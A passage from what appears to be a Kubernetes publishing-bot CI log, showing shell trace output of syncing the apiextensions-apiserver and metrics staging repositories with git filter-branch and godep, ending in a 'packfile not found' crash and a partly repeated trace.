split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code ca1024863b48cf0701229109df75ac5f0bb4907e\n>\t+ echo 'Remove redundant godep commits on-top of ca1024863b48cf0701229109df75ac5f0bb4907e.'\n>\t+ git reset --soft -q ca1024863b48cf0701229109df75ac5f0bb4907e\n>\tRemove redundant godep commits on-top of ca1024863b48cf0701229109df75ac5f0bb4907e.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/apiextensions-apiserver\n>\t+ local repo=apiextensions-apiserver\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'ba97476 Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-apiextensions-apiserver-release-1.12'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-apiextensions-apiserver-release-1.12\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=ca1024863b48cf0701229109df75ac5f0bb4907e\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-apiextensions-apiserver-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-apiextensions-apiserver-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-apiextensions-apiserver-release-1.12.sh --dependencies apimachinery:release-1.12,api:release-1.12,client-go:release-9.0,apiserver:release-1.12,code-generator:release-1.12 --mapping-output-file '../tag-apiextensions-apiserver-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.12\n>\t+ '[' ca1024863b48cf0701229109df75ac5f0bb4907e '!=' ca1024863b48cf0701229109df75ac5f0bb4907e ']'\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[05 Oct 18 01:17 UTC]: Successfully constructed release-1.12\n>[05 Oct 18 01:17 UTC]: Successfully ensured /go-workspace/src/k8s.io/metrics exists\n>[05 Oct 18 01:17 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[05 Oct 18 01:17 UTC]: /publish_scripts/construct.sh metrics master master apimachinery:master,api:master,client-go:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/metrics kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  686f29fbc4a78aae1bc020478db0711df3ee963d\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=metrics\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,api:master,client-go:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/metrics\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=686f29fbc4a78aae1bc020478db0711df3ee963d\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q c6bb70553a8287cd6451211dd366fee12e088b95\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=8a3888dcfae0c8d4b66c8f9b2a64de93f08002c2\n>\t+ '[' 8a3888dcfae0c8d4b66c8f9b2a64de93f08002c2 '!=' 686f29fbc4a78aae1bc020478db0711df3ee963d ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''686f29fbc4a78aae1bc020478db0711df3ee963d'\\'' to '\\''8a3888dcfae0c8d4b66c8f9b2a64de93f08002c2'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from '686f29fbc4a78aae1bc020478db0711df3ee963d' to '8a3888dcfae0c8d4b66c8f9b2a64de93f08002c2'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/metrics master master apimachinery:master,api:master,client-go:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/metrics\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=apimachinery:master,api:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\te06d172324b806a7c9f60ab0c167b4911b8ef253\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 11 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit e06d172324b806a7c9f60ab0c167b4911b8ef253.\n>\t+ echo 'Starting at existing master commit e06d172324b806a7c9f60ab0c167b4911b8ef253.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\t+ echo 'Checked out source commit 8a3888dcfae0c8d4b66c8f9b2a64de93f08002c2.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\tChecked out source commit 8a3888dcfae0c8d4b66c8f9b2a64de93f08002c2.\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ true\n>\t+ local k_base_commit=6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>\t+ '[' -z 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ']'\n>\t++ git-find-merge 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 upstream/master\n>\t++ tail -1\n>\t+++ git rev-list '6e52a05f444f951b037ca5d445a2b3c309d2f2a2^1..upstream/master' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 6e52a05f444f951b037ca5d445a2b3c309d2f2a2..upstream/master --ancestry-path\n>\t+++ git rev-parse 6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>\t+ local k_base_merge=6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>\t+ '[' -z 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ']'\n>\t+ git branch -f filtered-branch-base 6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/metrics.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/metrics.'\n>\tRunning git filter-branch ...\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/metrics 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/metrics\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/metrics -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=73d64bf50344e200c70ea74011c395ed9f78646b\n>\t++ git log --first-parent --format=%H --reverse 73d64bf50344e200c70ea74011c395ed9f78646b..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\tChecking out branch master.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=e06d172324b806a7c9f60ab0c167b4911b8ef253\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=e06d172324b806a7c9f60ab0c167b4911b8ef253\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' e06d172324b806a7c9f60ab0c167b4911b8ef253 '!=' e06d172324b806a7c9f60ab0c167b4911b8ef253 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:master,api:master,client-go:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:master,api:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=e06d172324b806a7c9f60ab0c167b4911b8ef253\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:master,api:master,client-go:master k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:master,api:master,client-go:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/metrics/\") or . == \"k8s.io/metrics\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,api:master,client-go:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ head -n 1\n>\t+ local k_last_kube_commit=6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>\t+ '[' -z 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ']'\n>\t++ git-find-merge 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 upstream-branch\n>\t+++ git rev-list '6e52a05f444f951b037ca5d445a2b3c309d2f2a2^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 6e52a05f444f951b037ca5d445a2b3c309d2f2a2..upstream-branch --ancestry-path\n>\t++ tail -1\n>\t+++ git rev-parse 6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>\t+ local k_last_kube_merge=6e52a05f444f951b037ca5d445a2b3c309d2f2a2\n>\t+ local dep_count=3\n>\t+ (( i=0 ))\n>\t+ (( i<3 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 6e52a05f444f951b037ca5d445a2b3c309d2f2a2.'\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 6e52a05f444f951b037ca5d445a2b3c309d2f2a2.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ../kube-commits-apimachinery-master\n>\t+ '[' -z c6dd271be00615c6fa8c91fdf63381265a5f0e4e ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to c6dd271be00615c6fa8c91fdf63381265a5f0e4e'\n>\t+ git checkout -q c6dd271be00615c6fa8c91fdf63381265a5f0e4e\n>\tChecking out k8s.io/apimachinery to c6dd271be00615c6fa8c91fdf63381265a5f0e4e\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit 6e52a05f444f951b037ca5d445a2b3c309d2f2a2.'\n>\t+ local k_commit=\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit 6e52a05f444f951b037ca5d445a2b3c309d2f2a2.\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ../kube-commits-api-master\n>\t+ '[' -z a191abe0b71e00ce4cde58af8002aa4c1a8bb068 ']'\n>\t+ pushd ../api\n>\tChecking out k8s.io/api to a191abe0b71e00ce4cde58af8002aa4c1a8bb068\n>\t+ echo 'Checking out k8s.io/api to a191abe0b71e00ce4cde58af8002aa4c1a8bb068'\n>\t+ git checkout -q a191abe0b71e00ce4cde58af8002aa4c1a8bb068\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=client-go\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 6e52a05f444f951b037ca5d445a2b3c309d2f2a2.'\n>\tLooking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 6e52a05f444f951b037ca5d445a2b3c309d2f2a2.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 6e52a05f444f951b037ca5d445a2b3c309d2f2a2 ../kube-commits-client-go-master\n>\t+ '[' -z 78bf9020c4adf8a8be946e9f4724575fe30cf5a0 ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to 78bf9020c4adf8a8be946e9f4724575fe30cf5a0'\n>\t+ git checkout -q 78bf9020c4adf8a8be946e9f4724575fe30cf5a0\n>\tChecking out k8s.io/client-go to 78bf9020c4adf8a8be946e9f4724575fe30cf5a0\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>\t+ rm -rf ./vendor/github.com/golang/glog\n>\tRemoving k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.\n>\t+ rm -rf ./vendor/k8s.io\n>\t+ rm -rf ./vendor/github.com/google/gofuzz\n>\t+ rm -rf ./vendor/github.com/go-openapi\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code e06d172324b806a7c9f60ab0c167b4911b8ef253\n>\tRemove redundant godep commits on-top of e06d172324b806a7c9f60ab0c167b4911b8ef253.\n>\t+ echo 'Remove redundant godep commits on-top of e06d172324b806a7c9f60ab0c167b4911b8ef253.'\n>\t+ git reset --soft -q e06d172324b806a7c9f60ab0c167b4911b8ef253\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ local repo=metrics\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'e06d172 Merge pull request #63498 from zioproto/patch-1' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\tF1005 01:17:56.268451    4029 main.go:112] Failed to get upstream branch refs/heads/upstream-branch first-parent list: failed to get first parent of 9125d03418b5599e624f55656d7aa13522fddade: failed to get 126a84283238f01ae799486e37b30a3aaeeea6fb: packfile not found\n>\tgoroutine 1 [running]:\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc42a29a500, 0xc424702b00, 0x10a, 0x15e)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xa3dd20, 0xc400000003, 0xc4200cc840, 0x9ef499, 0x7, 0x70, 0x0)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xa3dd20, 0xc400000003, 0x81392a, 0x36, 0xc42db33e88, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x81392a, 0x36, 0xc42db33e88, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>\tmain.main()\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/collapsed-kube-commit-mapper/main.go:112 +0x634\n>[05 Oct 18 01:17 UTC]: exit status 255\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=metrics\n>    \t+ SRC_BRANCH=master\n>    \t+ DST_BRANCH=master\n>    \t+ DEPS=apimachinery:master,api:master,client-go:master\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/metrics\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=true\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=686f29fbc4a78aae1bc020478db0711df3ee963d\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q c6bb70553a8287cd6451211dd366fee12e088b95\n>    \t+ git branch -D master\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/master\n>    \t+ echo 'Switching to origin/master.'\n>    \t+ git branch -f master origin/master\n>    \t+ git checkout -q master\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/master\n>    \t+ UPSTREAM_HASH=8a3888dcfae0c8d4b66c8f9b2a64de93f08002c2\n>    \t+ '[' 8a3888dcfae0c8d4b66c8f9b2a64de93f08002c2 '!=' 686f29fbc4a78aae1bc020478db0711df3ee963d ']'\n>    \t+ echo 'Upstream branch upstream/master moved from '\\''686f29fbc4a78aae1bc020478db0711df3ee963d'\\'' to '\\''8a3888dcfae0c8d4b66c8f9b2a64de93f08002c2'\\''. We have to sync.'\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/metrics master master apimachinery:master,api:master,client-go:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/metrics\n>    \t+ local src_branch=master\n>    \t+ local dst_branch=master\n>    \t+ local deps=apimachinery:master,api:master,client-go:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ shift 9\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git 